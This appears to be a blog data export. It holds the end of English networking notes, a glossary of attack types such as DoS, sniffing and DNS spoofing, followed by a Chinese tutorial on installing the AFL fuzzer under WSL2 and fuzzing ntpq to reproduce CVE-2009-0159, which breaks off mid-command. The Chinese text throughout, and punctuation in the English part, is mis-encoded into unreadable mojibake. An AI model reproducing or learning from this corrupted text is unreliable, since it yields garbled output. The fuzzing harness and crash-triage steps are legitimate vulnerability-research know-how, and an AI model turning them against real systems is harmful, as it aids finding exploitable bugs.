malware out there today is self-replicating: once it infects one host, from that host it seeks entry into other hosts over the Internet, and from the newly infected hosts, it seeks entry into yet more hosts. In this manner, self-replicating malware can spread exponentially fast. Virus â€“ A malware which requires some form of userâ€™s interaction to infect the userâ€™s device. The classic example is an e-mail attachment containing malicious executable code. If a user receives and opens such an attachment, the user inadvertently runs the malware on the device. Worm â€“ A malware which can enter a device without any explicit user interaction. For example, a user may be running a vulnerable network application to which an attacker can send malware. In some cases, without any user intervention, the application may accept the malware from the Internet and run it, creating a worm. Botnet â€“ A network of private computers infected with malicious software and controlled as a group without the ownersâ€™ knowledge, e.g. to send spam. DoS (Denial of Service) â€“ A DoS attack renders a network, host, or other pieces of infrastructure unusable by legitimate users. Most Internet DoS attacks fall into one of three categories : â€¢ Vulnerability attack: This involves sending a few well-crafted messages to a vulnerable application or operating system running on a targeted host. If the right sequence of packets is sent to a vulnerable application or operating system, the service can stop or, worse, the host can crash. â€¢ Bandwidth flooding: The attacker sends a deluge of packets to the targeted hostâ€”so many packets that the targetâ€™s access link becomes clogged, preventing legitimate packets from reaching the server. â€¢ Connection flooding: The attacker establishes a large number of half-open or fully open TCP connections at the target host. The host can become so bogged down with these bogus connections that it stops accepting legitimate connections. DDoS (Distributed DoS) â€“ DDoS is a type of DOS attack where multiple compromised systems, are used to target a single system causing a Denial of Service (DoS) attack. DDoS attacks leveraging botnets with thousands of comprised hosts are a common occurrence today. DDoS attacks are much harder to detect and defend against than a DoS attack from a single host. Packet sniffer â€“ A passive receiver that records a copy of every packet that flies by is called a packet sniffer. By placing a passive receiver in the vicinity of the wireless transmitter, that receiver can obtain a copy of every packet that is transmitted! These packets can contain all kinds of sensitive information, including passwords, social security numbers, trade secrets, and private personal messages. some of the best defenses against packet sniffing involve cryptography. IP Spoofing â€“ The ability to inject packets into the Internet with a false source address is known as IP spoofing, and is but one of many ways in which one user can masquerade as another user. To solve this problem, we will need end-point authentication, that is, a mechanism that will allow us to determine with certainty if a message originates from where we think it does. Man-in-the-Middle Attack â€“ As the name indicates, a man-in-the-middle attack occurs when someone between you and the person with whom you are communicating is actively monitoring, capturing, and controlling your communication transparently. For example, the attacker can re-route a data exchange. When computers are communicating at low levels of the network layer, the computers might not be able to determine with whom they are exchanging data. Compromised-Key Attack â€“ A key is a secret code or number necessary to interpret secured information. Although obtaining a key is a difficult and resource-intensive process for an attacker, it is possible. After an attacker obtains a key, that key is referred to as a compromised key. An attacker uses the compromised key to gain access to a secured communication without the sender or receiver being aware of the attack. Phishing â€“ The fraudulent practice of sending emails purporting to be from reputable companies in order to induce individuals to reveal personal information, such as passwords and credit card numbers. DNS spoofing â€“ Also referred to as DNS cache poisoning, is a form of computer security hacking in which corrupt Domain Name System data is introduced into the DNS resolverâ€™s cache, causing the name server to return an incorrect IP address. ç¬¬ä¸€æ¬¡ç”¨è‹±æ–‡åšç¬”è®°ï¼Œæœ‰è¯­æ³•é”™è¯¯çš„è¯è§è°…ï¼Œæ¯•ç«Ÿåªæ˜¯ä¸€ä¸ªä½åˆ†é£˜è¿‡å…­çº§çš„å°åºŸç‰©ç½¢äº†ã€‚ã€‚ã€‚ Ps. æ±‚ç¬¬å…«ç‰ˆçš„PDFå•Šï¼ä¸æ˜¯ä¸­æ–‡searchableçš„ä¹Ÿè¡Œå•Šï¼ç°åœ¨åªèƒ½ç¬¬ä¸ƒç‰ˆçš„å’Œslidesæ··ç€çœ‹ã€‚ã€‚ã€‚ã€‚ Referencehttp://gaia.cs.umass.edu/kurose_ross/index.html â†©https://www.whoismyisp.org/articles/what-is-an-isp â†©https://www.differencebetween.com/difference-between-throughput-and-vs-bandwidth/ â†©Speed vs Bandwidth Explained - Arvig â†©https://speed.cloudflare.com/ â†©https://www.geeksforgeeks.org/layers-of-osi-model/ â†©","categories":[],"tags":[{"name":"Computer Networking","slug":"Computer-Networking","permalink":"https://mundi-xu.github.io/tags/Computer-Networking/"},{"name":"A Top-Down Approach","slug":"A-Top-Down-Approach","permalink":"https://mundi-xu.github.io/tags/A-Top-Down-Approach/"},{"name":"notes","slug":"notes","permalink":"https://mundi-xu.github.io/tags/notes/"},{"name":"Introduction","slug":"Introduction","permalink":"https://mundi-xu.github.io/tags/Introduction/"},{"name":"OSI Model","slug":"OSI-Model","permalink":"https://mundi-xu.github.io/tags/OSI-Model/"},{"name":"TCP/IP Model","slug":"TCP-IP-Model","permalink":"https://mundi-xu.github.io/tags/TCP-IP-Model/"}]},{"title":"WSL2ä¸‹AFLçš„å®‰è£…ä¸æµ‹è¯•","slug":"WSL2ä¸‹AFLçš„å®‰è£…ä¸æµ‹è¯•","date":"2021-01-09T02:05:21.000Z","updated":"2021-03-31T03:11:08.885Z","comments":true,"path":"2021/01/09/WSL2ä¸‹AFLçš„å®‰è£…ä¸æµ‹è¯•/","link":"","permalink":"https://mundi-xu.github.io/2021/01/09/WSL2%E4%B8%8BAFL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E6%B5%8B%E8%AF%95/","excerpt":"WSL2ä¸‹AFLçš„å®‰è£…æ•™ç¨‹å¹¶åˆ©ç”¨FuzzingæŠ€æœ¯å¯¹CVE-2009-0159è¿›è¡Œäº†å¤ç°å’ŒåŸç†åˆ†æã€‚","text":"ç®€ä»‹AFLå·ç§°æ˜¯å½“å‰æœ€é«˜çº§çš„Fuzzingæµ‹è¯•å·¥å…·ä¹‹ä¸€ï¼Œç”±lcamtufæ‰€å¼€å‘ã€‚åœ¨ä¼—å¤šå®‰å…¨ä¼šè®®ç™½å¸½æ¼”è®²ä¸­éƒ½ä»‹ç»è¿‡è¿™æ¬¾å·¥å…·ï¼Œä»¥åŠ2016å¹´defconå¤§ä¼šçš„CGC(Cyber Grand Challengeï¼Œå½¢å¼ä¸ºæœºå™¨è‡ªåŠ¨æŒ–æ˜å¹¶ä¿®è¡¥æ¼æ´)å¤§èµ›ä¸­å¤šæ”¯é˜Ÿä¼åˆ©ç”¨AFL fuzzingæŠ€æœ¯ä¸ç¬¦å·æ‰§è¡Œ(Symbolic Execution)æ¥å®ç°æ¼æ´æŒ–æ˜ï¼Œå…¶ä¸­å‚èµ›é˜Ÿä¼shellphishä¾¿æ˜¯é‡‡ç”¨AFL(Fuzzing) + angr(Symbolic Execution)æŠ€æœ¯ã€‚ æœ¬æ–‡é¦–å…ˆç®€å•ä»‹ç»ä¸€ä¸‹AFLçš„å®‰è£…æ­¥éª¤å’ŒåŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼Œéšåä»¥ntpqä¸ºä¾‹è®°å½•ä¸€ä¸‹ä½¿ç”¨AFLæ¥fuzzçš„è¿‡ç¨‹å¹¶å¯¹CVE-2009-0159è¿›è¡Œäº†å¤ç°å’ŒåŸç†åˆ†æã€‚ AFLä¸‹è½½ä¸å®‰è£…AFLå¯ä»¥å¯¹æœ‰æºç å’Œæ— æºç çš„ç¨‹åºè¿›è¡Œfuzzã€‚å¯¹æœ‰æºç çš„ç¨‹åºFuzzçš„åŸç†ç®€å•æ¥è¯´å°±æ˜¯åœ¨ç¨‹åºç¼–è¯‘æ—¶ï¼Œå‘æ±‡ç¼–ä»£ç ä¸­æ’å…¥è‡ªå·±çš„æŒ‡ä»¤ï¼Œä»è€Œåœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œè®¡ç®—è¦†ç›–ç‡ã€‚å½“æŠŠæ ·æœ¬å–‚ç»™ç¨‹åºæ¥Fuzzæ—¶ï¼Œå¦‚æœAFLå‘ç°ç¨‹åºæ‰§è¡Œäº†æ–°çš„è·¯å¾„ï¼Œå°±æŠŠå½“å‰çš„æ ·æœ¬ä¿å­˜åœ¨Queueä¸­ï¼ŒåŸºäºè¿™ä¸ªæ–°çš„æ ·æœ¬æ¥ç»§ç»­Fuzzã€‚[1] ä¸å…¶ä»–åŸºäºæ’æ¡©æŠ€æœ¯çš„fuzzersç›¸æ¯”ï¼Œafl-fuzzå…·æœ‰è¾ƒä½çš„æ€§èƒ½æ¶ˆè€—ï¼Œæœ‰å„ç§é«˜æ•ˆçš„fuzzingç­–ç•¥å’Œtricksæœ€å°åŒ–æŠ€å·§ï¼Œä¸éœ€è¦å…ˆè¡Œå¤æ‚çš„é…ç½®ï¼Œèƒ½æ— ç¼å¤„ç†å¤æ‚çš„ç°å®ä¸­çš„ç¨‹åºã€‚å½“ç„¶AFLä¹Ÿå¯ä»¥ç›´æ¥å¯¹æ²¡æœ‰æºç çš„äºŒè¿›åˆ¶ç¨‹åºè¿›è¡Œæµ‹è¯•ï¼Œä½†éœ€è¦QEMUçš„æ”¯æŒã€‚ æœ¬ä½“å®‰è£…ä¸æµ‹è¯•1234wget https://lcamtuf.coredump.cx/afl/releases/afl-latest.tgztar -xvf afl-latest.tgzcd afl-2.52bmake &amp;&amp; sudo make install which afl-fuzzæœ‰å›æ˜¾å³å®‰è£…æˆåŠŸ æ¨èå»Github[2]ä¸Šä¸‹è½½ï¼Œä¸€ç›´åœ¨ç»´æŠ¤ï¼Œå®‰è£…è¿‡ç¨‹ç›¸åŒã€‚(æˆªæ­¢å‘æ–‡ï¼Œæœ€æ–°ç‰ˆä¸ºv2.57b) Ps. Kaliçš„æºä¸­åŒ…å«aflï¼Œå¯ä»¥ç›´æ¥å°è¯• apt install aflã€‚ æµ‹è¯• æ–°å»ºè¾“å…¥ã€è¾“å‡ºæ–‡ä»¶å¤¹ï¼š mkdir in out å‡†å¤‡åˆå§‹åŒ–testcase, å°†testcaseå†…å®¹éšæ„å†™æˆaaa: echo aaa &gt; in/testcase éšä¾¿æ‰¾ä¸ªä»£ç ç¼–è¯‘æµ‹è¯• 12afl-gcc test.c -o testafl-fuzz -i in -o out ./test å¯åŠ¨afl-fuzzä¸­å¯èƒ½ä¼šæŠ¥é”™ï¼Œè¡¨ç¤ºæŸäº›ç¯å¢ƒå˜é‡æ²¡æœ‰é…ç½®æˆ–è€…é…ç½®é”™è¯¯ï¼Œæ ¹æ®æç¤ºä¿®æ”¹æˆ–é…ç½®afl-fuzz optionsä»¥åŠç³»ç»Ÿç¯å¢ƒå˜é‡å³å¯ã€‚ ç»“æœå¤§æ¦‚å¦‚ä¸‹ï¼š å·¥ä½œçŠ¶æ€afl-fuzzæ°¸è¿œä¸ä¼šåœæ­¢ï¼Œæ‰€ä»¥ä½•æ—¶åœæ­¢æµ‹è¯•å¾ˆå¤šæ—¶å€™å°±æ˜¯ä¾é afl-fuzzæä¾›çš„çŠ¶æ€æ¥å†³å®šçš„ã€‚å…·ä½“çš„å‡ ç§æ–¹å¼å¦‚ä¸‹æ‰€ç¤º: çŠ¶æ€çª—å£çš„cycles doneå˜ä¸ºç»¿è‰²; afl-whatsupæŸ¥çœ‹afl-fuzzçŠ¶æ€; afl-statå¾—åˆ°ç±»ä¼¼äºafl-whatsupçš„è¾“å‡ºç»“æœ; å®šåˆ¶afl-whatsup-&gt;åœ¨æ‰€æœ‰ä»£ç å¤–é¢åŠ ä¸ªå¾ªç¯å°±å¥½; ç”¨afl-plotç»˜åˆ¶å„ç§çŠ¶æ€æŒ‡æ ‡çš„ç›´è§‚å˜åŒ–è¶‹åŠ¿; pythiaä¼°ç®—å‘ç°æ–°crashå’Œpathæ¦‚ç‡ã€‚ fuzzingç»“æŸæ—¶æœºå‚è€ƒ çŠ¶æ€çª—å£ä¸­â€cycles doneâ€å­—æ®µé¢œè‰²å˜ä¸ºç»¿è‰²è¯¥å­—æ®µçš„é¢œè‰²å¯ä»¥ä½œä¸ºä½•æ—¶åœæ­¢æµ‹è¯•çš„å‚è€ƒ; è·ä¸Šä¸€æ¬¡å‘ç°æ–°è·¯å¾„ï¼ˆæˆ–è€…å´©æºƒï¼‰å·²ç»è¿‡å»å¾ˆé•¿æ—¶é—´äº†ï¼Œè‡³äºå…·ä½“å¤šå°‘æ—¶é—´è¿˜æ˜¯éœ€è¦è‡ªå·±æŠŠæ¡; ç›®æ ‡ç¨‹åºçš„ä»£ç å‡ ä¹è¢«æµ‹è¯•ç”¨ä¾‹å®Œå…¨è¦†ç›–ï¼Œè¿™ç§æƒ…å†µå¥½åƒå¾ˆå°‘è§; pythiaæä¾›çš„å„ç§æ•°æ®ä¸­ï¼Œpath coveraè¾¾åˆ°99æˆ–è€…correctnessçš„å€¼è¾¾åˆ°1e-08(å«ä¹‰: ä»ä¸Šæ¬¡å‘ç°path/uniq crashåˆ°ä¸‹ä¸€æ¬¡å‘ç°ä¹‹é—´å¤§çº¦éœ€è¦1äº¿æ¬¡æ‰§è¡Œ) è¾“å‡ºç»“æœè¯´æ˜ queueï¼šå­˜æ”¾æ‰€æœ‰å…·æœ‰ç‹¬ç‰¹æ‰§è¡Œè·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ã€‚ crashesï¼šå¯¼è‡´ç›®æ ‡æ¥æ”¶è‡´å‘½signalè€Œå´©æºƒçš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ã€‚ crashes/README.txtï¼šä¿å­˜äº†ç›®æ ‡æ‰§è¡Œè¿™äº›crashæ–‡ä»¶çš„å‘½ä»¤è¡Œå‚æ•°ã€‚ hangsï¼šå¯¼è‡´ç›®æ ‡è¶…æ—¶çš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ã€‚ fuzzer_statsï¼šafl-fuzzçš„è¿è¡ŒçŠ¶æ€ã€‚ plot_dataï¼šç”¨äºafl-plotç»˜å›¾ã€‚ AFLå·¥ä½œåŸç†ç®€ä»‹Fuzzæµç¨‹ï¼š è¯»å–è¾“å…¥çš„åˆå§‹testcase, å°†å…¶æ”¾å…¥åˆ°queueä¸­ï¼› ä»queueä¸­è¯»å–å†…å®¹ä½œä¸ºç¨‹åºè¾“å…¥ï¼› å°è¯•åœ¨ä¸å½±å“æµç¨‹çš„æƒ…å†µä¸‹ç²¾ç®€è¾“å…¥ï¼› å¯¹è¾“å…¥è¿›è¡Œè‡ªåŠ¨çªå˜ï¼› å¦‚æœçªå˜åçš„è¾“å…¥èƒ½å¤Ÿæœ‰æ–°çš„çŠ¶æ€è½¬ç§»ï¼Œå°†ä¿®æ”¹åçš„è¾“å…¥æ”¾å…¥queueä¸­ï¼› å›åˆ°2ã€‚ åœ¨ä½¿ç”¨AFL ç¼–è¯‘å·¥å…· afl-gccå¯¹æºç è¿›è¡Œç¼–è¯‘æ—¶ï¼Œç¨‹åºä¼šä½¿ç”¨afl-aså·¥å…·å¯¹ç¼–è¯‘å¹¶æœªæ±‡ç¼–çš„c/c++ä»£ç è¿›è¡Œæ’æ¡©ã€‚è¿‡ç¨‹å¦‚ä¸‹ï¼š afl-as.hå®šä¹‰äº†è¢«æ’å…¥ä»£ç ä¸­çš„æ±‡ç¼–ä»£ç ï¼› afl-asé€æ­¥åˆ†æ.sæ–‡ä»¶(æ±‡ç¼–ä»£ç )ï¼Œæ£€æµ‹ä»£ç ç‰¹å¾å¹¶æ’å…¥æ¡©ã€‚ è¯¦ç»†è¿‡ç¨‹ï¼š ç¼–è¯‘é¢„å¤„ç†ç¨‹åºå¯¹æºæ–‡ä»¶è¿›è¡Œé¢„å¤„ç†ï¼Œç”Ÿæˆé¢„å¤„ç†æ–‡ä»¶(.iæ–‡ä»¶) ç¼–è¯‘æ’æ¡©ç¨‹åºå¯¹.iæ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œç”Ÿæˆæ±‡ç¼–æ–‡ä»¶(.sæ–‡ä»¶)ï¼ŒaflåŒæ—¶å®Œæˆæ’æ¡© æ±‡ç¼–ç¨‹åº(as)å¯¹.sæ–‡ä»¶è¿›è¡Œæ±‡ç¼–ï¼Œç”Ÿæˆç›®æ ‡æ–‡ä»¶(.oæ–‡ä»¶) é“¾æ¥ç¨‹åº(ld)å¯¹.oæ–‡ä»¶è¿›è¡Œè¿æ¥ï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶(.out/.elfæ–‡ä»¶) å½“ç„¶llvm/clangæ’æ¡©æ–¹å¼æ˜¯å¦å¤–çš„ä¸€å¥—æœºåˆ¶ï¼Œé€šè¿‡ä¿®æ”¹LLVM IR(ä¸­é—´è¯­è¨€)å®ç°ã€‚ LLVM ModeLLVM Mode(afl-clang)æ¨¡å¼ç¼–è¯‘ç¨‹åºFuzzingé€Ÿåº¦æ˜¯afl-gccæ¨¡å¼çš„2å€ï¼Œä½†æ˜¯ä½¿ç”¨æ­¤æ¨¡å¼å¿…é¡»å…ˆå®‰è£…llvmå¥—ä»¶,é…ç½®LLVM_CONFIG(export LLVM_CONFIG=which llvm-config ),ç„¶ååœ¨afl/llvm_mode/æ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œmakeï¼Œä¼šåœ¨aflç›®å½•ä¸‹ç”Ÿæˆafl-clang-fast/afl-clang-fast++ã€‚ ä½¿ç”¨afl-clang-fastç¼–è¯‘Cç¨‹åºï¼š 12CC=/path_to_afl/afl-clang-fast ./configure [...options...]make æœ€åè¿˜æ˜¯ä¼šè°ƒç”¨clang/clang++æ¥ç¼–è¯‘ç¨‹åºï¼Œåœ¨ç¼–è¯‘ç¨‹åºæ—¶ä¼šæ£€æŸ¥ç¼–è¯‘é€‰é¡¹(makefileä¸­çš„CFLAGS)ï¼Œclangæä¾›å¾ˆå¤šå†…å­˜æ£€æŸ¥çš„å·¥å…·å¦‚ASAN/MSAN/UBSANç­‰ï¼Œä»¥åŠaflç¼–è¯‘é€‰é¡¹AFL_QUIET(Qemuæ¨¡å¼)ï¼Œè¿™äº›é€‰é¡¹å¯ä»¥ç›´æ¥å¡«å†™è¿›makefileçš„ç¼–è¯‘é€‰é¡¹ä¹Ÿå¯ä»¥è®¾ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œafl-gcc/afl-clangåœ¨å¼€å§‹ç¼–è¯‘å‰ä¼šæ£€æŸ¥è¿™äº›ç¯å¢ƒå˜é‡ã€‚ Ps. å¦‚æœå‡ºç°äº†error: clang frontend command failed due to signal (use -v to see invocation)é”™è¯¯å¯ä»¥æ¢æˆGitHubä¸Šçš„æœ€æ–°ç‰ˆæœ¬å†æ¬¡å°è¯•ã€‚ï¼ˆ2.57bç‰ˆæœ¬å·²ä¿®å¤ï¼‰ Qemu Modeåœ¨æ— æºç çš„æƒ…å†µä¸‹FuzzingäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œéœ€è¦å®‰è£…glib2-devel libtool wget python automake autoconf sha384sum bison iconvç­‰ä¾èµ– 1234cd afl-2.52bcd qemu_mode./build_qemu_support.shexport AFL_PATH=~/afl-2.52b #aflæ ¹ç›®å½• ä½¿ç”¨aptå®‰è£…ç¼ºå¤±çš„åº“å³å¯ï¼Œå¦‚sudo apt install libglib2* (glib2) æˆ– sudo apt-get install libtool* (libtool)ã€‚ å½“å‡ºç°util/memfd.cé”™è¯¯æ—¶ï¼Œå¯å‚ç…§ä»¥ä¸‹æ–¹æ³•[3]ï¼ˆ2.57bç‰ˆæœ¬å·²ä¿®å¤ï¼‰ åˆ›å»ºä¸€ä¸ªåä¸ºâ€œmemfd_create.diffâ€çš„æ–‡ä»¶ï¼Œç„¶åå°†ä¸‹åˆ—ä»£ç ç²˜è´´è¿›å»: 123456789101112diff -ru qemu-2.10.0-clean/util/memfd.c qemu-2.10.0/util/memfd.c--- qemu-2.10.0-clean/util/memfd.c 2018-11-20 18:11:00.170271506 +0100+++ qemu-2.10.0/util/memfd.c 2018-11-20 18:11:13.398423613 +0100@@ -37,7 +37,7 @@ #include &lt;sys/syscall.h&gt; #include &lt;asm/unistd.h&gt;-static int memfd_create(const char *name, unsigned int flags)+int memfd_create(const char *name, unsigned int flags) &#123; #ifdef __NR_memfd_create return syscall(__NR_memfd_create, name, flags); å°†memfd_create.diffæ”¾åœ¨patches/ç›®å½•ä¸‹åä¿®æ”¹build_qemu_support.sh 1234patch -p1 &lt;../patches/elfload.diff || exit 1patch -p1 &lt;../patches/cpu-exec.diff || exit 1patch -p1 &lt;../patches/syscall.diff || exit 1patch -p1 &lt;../patches/memfd_create.diff || exit 1 # æ·»åŠ ä¸€è¡Œ ç„¶åå†æ¬¡è¿è¡Œbuild_qemu_support.shå³å¯ å¦‚é‡å…¶ä»–é—®é¢˜å¯ä»¥Googleååé¦ˆåœ¨è¯„è®ºåŒºï¼Œæˆ‘èƒ½è§£å†³çš„é—®é¢˜éƒ½ä¼šå›å¤ã€‚ ntp-4.2.2 æµ‹è¯•NTPæ˜¯ä¸€ç§æ—¨åœ¨é€šè¿‡ç½‘ç»œåŒæ­¥è®¡ç®—æœºæ—¶é’Ÿçš„åè®®ã€‚æˆ‘ä»¬å°†ä½¿ç”¨aflå¯¹å…¶éƒ¨ä»¶ntpqè¿›è¡Œç™½ç›’æµ‹è¯•ä»¥å°è¯•å¤ç°CVE-2009-0159[4]ï¼Œæµ‹è¯•ç‰ˆæœ¬ä¸ºv4.2.2ï¼Œå¯ç‚¹å‡»æ­¤å¤„ä¸‹è½½ã€‚ ntpq is a utility included as part of the NTP Reference Implementation suite of tools. It queries a server (e.g. ntpd) and provides information to the user. ç¼–è¯‘æµ‹è¯•ä¸ºåŠ å¿«æµ‹è¯•é€Ÿåº¦ï¼Œæˆ‘ä»¬åªç¼–è¯‘æµ‹è¯•ntpqéƒ¨åˆ†ï¼š 123CC=afl-clang-fast ./configure &amp;&amp; AFL_HARDEN=1 make -C ntpqcd ..afl-fuzz -i in -o out ntp-4.2.2/ntpq/ntpq ä½ å¯ä»¥åœ¨å‡ åˆ†é’Ÿå†…æ‰¾åˆ°CVE-2009-0159è€Œæ— éœ€è¿›ä¸€æ­¥çš„å·¥ä½œï¼Œå°¤å…¶æ˜¯åœ¨ä½¿ç”¨persistent modeæ—¶ã€‚ä½†å½“ä½ ä¸å¤Ÿæ¬§æ—¶ï¼ˆæ¯”å¦‚è¯´æˆ‘ï¼‰ï¼Œå°±å¯èƒ½è·‘åˆ°è‡ªé—­ã€‚ã€‚ã€‚è¿˜ä¼šå¤šå‡ºå¾ˆå¤šæ— ç”¨çš„è¾“å‡ºæ–‡ä»¶ã€‚ï¼ˆè™½ç„¶æˆ‘è¿è¡Œæ—¶é—´ç¡®å®ä¸é•¿ï¼‰ ä¼˜åŒ–å¤šæ ¸å¹¶è¡ŒæŸ¥çœ‹ç³»ç»Ÿæ ¸å¿ƒæ•° 1cat /proc/cpuinfo| grep &quot;cpu cores&quot;| uniq afl-fuzzå¹¶è¡ŒFuzzingä¸€èˆ¬çš„åšæ³•æ˜¯é€šè¿‡-Må‚æ•°æŒ‡å®šä¸€ä¸ªä¸»Fuzzer(Master Fuzzer)ã€é€šè¿‡-Så‚æ•°æŒ‡å®šå¤šä¸ªä»Fuzzer(Slave Fuzzer)ã€‚ 123screen afl-fuzz -i in -o out -M fuzzer1 -- ntp-4.2.2/ntpq/ntpqscreen afl-fuzz -i in -o out -S fuzzer2 -- ntp-4.2.2/ntpq/ntpqscreen afl-fuzz -i in -o out -S fuzzer3 -- ntp-4.2.2/ntpq/ntpq PS. -oæŒ‡å®šçš„æ˜¯ä¸€ä¸ªåŒæ­¥ç›®å½•ï¼Œåœ¨å¹¶è¡Œæµ‹è¯•ä¸­æ‰€æœ‰çš„Fuzzerå°†ç›¸äº’åä½œï¼Œæ‰¾åˆ°æ–°çš„ä»£ç è·¯å¾„æ—¶ä¼šç›¸äº’ä¼ é€’æ–°çš„æµ‹è¯•ç”¨ä¾‹ï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒé‡å¤çš„é—®é¢˜ã€‚ afl-whatsupå¯ä»¥æŸ¥çœ‹æ¯ä¸ªfuzzerçš„è¿è¡ŒçŠ¶æ€å’Œæ€»ä½“è¿è¡Œæ¦‚å†µï¼ŒåŠ ä¸Š-sé€‰é¡¹åªæ˜¾ç¤ºæ¦‚å†µï¼Œå…¶ä¸­çš„æ•°æ®éƒ½æ˜¯æ‰€æœ‰fuzzerçš„æ€»å’Œã€‚ afl-gotcpuå¯ä»¥æŸ¥çœ‹æ¯ä¸ªæ ¸å¿ƒä½¿ç”¨çŠ¶æ€ã€‚ æºç ä¼˜åŒ–ä¸å…¶å°è¯•è®©aflçš„è¾“å‡ºå»æ¨¡æ‹Ÿntpdç¨‹åºï¼Œä¸å¦‚ç›´æ¥å°†ntpq/ntpq.cä¸­çš„main()å‡½æ•°æ›¿æ¢ä¸ºä»stdinè¯»å–æ•°æ®ç±»å‹ï¼ŒçŠ¶æ€å’Œæ•°æ®å¹¶å°†è¾“å‡ºæ–‡ä»¶ä½œä¸ºstdoutçš„ä»£ç ã€‚è¿™ä¹Ÿæ˜¯æµ‹è¯•network programçš„å¸¸è§æ–¹æ³•â€”â€”éš”ç¦»æµ‹è¯•è§£æå™¨ä¹‹ç±»çš„ç›®æ ‡åŠŸèƒ½ã€‚ å°†nptqmain()æ›¿æ¢å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627int ntpqmain( int argc, char *argv[])&#123;#ifdef __AFL_HAVE_MANUAL_CONTROL __AFL_INIT();#endif int datatype = 0; int status = 0; char data[1024 * 16] = &#123;0&#125;; int length = 0;#ifdef __AFL_HAVE_MANUAL_CONTROL while (__AFL_LOOP(1000)) &#123;#endif datatype = 0; status = 0; memset(data, 0, 1024 * 16); read(0, &amp;datatype, 1); read(0, &amp;status, 1); length = read(0, data, 1024 * 16); cookedprint(datatype, length, data, status, stdout);#ifdef __AFL_HAVE_MANUAL_CONTROL &#125;#endif return 0;&#125; 16kbçš„ç¼“å†²åŒºå¤§å°å¯ä»¥éšæ„æ”¹å˜ï¼Œè¿‡å°çš„ç¼“å†²åŒºå¯ä»¥åŠ å¿«æµ‹è¯•é€Ÿåº¦ï¼Œä½†ä¹Ÿå¯èƒ½é”™è¿‡æŸäº›Bugã€‚ å°†ä¸‹è¿°ä»£ç æ·»åŠ åˆ°nextvarçš„å¼€å¤´å¯ä»¥ç¡®ä¿è¿™äº›é™æ€å˜é‡ä¸ä¼šä¿ç•™ä»ä¸€æ¬¡è¿è¡Œåˆ°ä¸‹ä¸€æ¬¡è¿è¡Œçš„æ•°æ®ï¼Œä»è€Œæ˜¾è‘—æ”¹å–„æ€§èƒ½ã€‚ 12memset(name, 0, sizeof(name));memset(value, 0, sizeof(value)); å­—å…¸åœ¨æ²¡æœ‰ä»»ä½•å¸®åŠ©çš„æƒ…å†µä¸‹aflä¼šè€—è´¹å¾ˆé•¿æ—¶é—´æ‰èƒ½æ‰¾åˆ°å¯ä»¥ä»varfmtè¿”å›çš„æ‰€æœ‰ä¸åŒæ ¼å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨é¡¹ç›®ä¸­æ£€æµ‹ä¸€äº›å¯ç”¨çš„å­—ç¬¦ä¸²åˆ°å­—å…¸ä¸­ä¾›aflä½¿ç”¨ï¼Œå¦‚ï¼š 123456789101112131415static const char *tstflagnames[] = &#123; &quot;pkt_dup&quot;, /* TEST1 */ &quot;pkt_bogus&quot;, /* TEST2 */ &quot;pkt_proto&quot;, /* TEST3 */ &quot;pkt_denied&quot;, /* TEST4 */ &quot;pkt_auth&quot;, /* TEST5 */ &quot;pkt_synch&quot;, /* TEST6 */ &quot;pkt_dist&quot;, /* TEST7 */ &quot;pkt_autokey&quot;, /* TEST8 */ &quot;pkt_crypto&quot;, /* TEST9 */ &quot;peer_stratum&quot;, /* TEST10 */ &quot;peer_dist&quot;, /* TEST11 */ &quot;peer_loop&quot;, /* TEST12 */ &quot;peer_unfit&quot; /* TEST13 */&#125;; ä½¿ç”¨-xå‘½ä»¤è°ƒç”¨å­—å…¸ã€‚ 1afl-fuzz -i in -o out -x ntpq.dict ntp-4.2.2/ntpq/ntpq å€ŸåŠ©è¯¥å­—å…¸ï¼Œæˆ‘ä»¬èƒ½æ‰¾åˆ°çš„è·¯å¾„æ•°é‡ä¼šå¤§å¤§å¢åŠ ã€‚ æµ‹è¯•é‡æ–°ç¼–è¯‘åå†æ¬¡è¿è¡Œfuzzï¼š å¯ä»¥å‘ç°æœå¯»æ•ˆç‡ä¸ä¹‹å‰ç›¸æ¯”æœ‰äº†å·¨å¤§çš„æå‡ï¼Œç»§ç»­è¿è¡Œï¼š ç»“æœåˆ†æåˆ°äº†è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»è·‘å‡ºäº†ä¸€å¤§å †çš„crashesï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è‡ªç„¶æ˜¯ç¡®å®šé€ æˆè¿™äº›crashesçš„bugæ˜¯å¦å¯ä»¥åˆ©ç”¨ä»¥åŠæ€ä¹ˆåˆ©ç”¨ã€‚åè€…å¯èƒ½ä¼šè¦å›°éš¾å¾—å¤šï¼Œè¿™éœ€è¦å¯¹å¸¸è§çš„äºŒè¿›åˆ¶æ¼æ´ç±»å‹ã€æ“ä½œç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶ã€ä»£ç å®¡è®¡å’Œè°ƒè¯•ç­‰å†…å®¹éƒ½æœ‰ä¸€å®šæ·±åº¦çš„äº†è§£ã€‚ä½†å¦‚æœåªæ˜¯å¯¹crashåšç®€å•çš„åˆ†æå’Œåˆ†ç±»ï¼Œé‚£ä¹ˆä¸‹é¢ä»‹ç»çš„å‡ ç§æ–¹æ³•éƒ½å¯ä»¥æä¾›ä¸€äº›å¸®åŠ©ã€‚ crash exploration modeè¿™æ˜¯afl-fuzzçš„ä¸€ç§è¿è¡Œæ¨¡å¼ï¼Œä¹Ÿç§°ä¸ºperuvian rabbit modeï¼Œç”¨äºç¡®å®šbugçš„å¯åˆ©ç”¨æ€§ï¼Œå…·ä½“ç»†èŠ‚å¯ä»¥å‚è€ƒlcamtufçš„åšå®¢ã€‚ 1afl-fuzz -m none -C -i ./out/crashes -o out_crashes -x ntpq.dict -- 